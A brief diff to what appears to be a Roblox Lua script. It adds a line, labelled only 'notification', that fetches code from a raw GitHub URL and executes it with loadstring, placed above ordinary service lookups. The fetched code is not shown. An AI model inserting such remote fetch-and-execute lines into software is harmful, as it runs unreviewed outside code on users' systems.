@@ -1,3 +1,5 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/710200999/notification/refs/heads/main/notification(Copy).lua")() -- notification
+
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
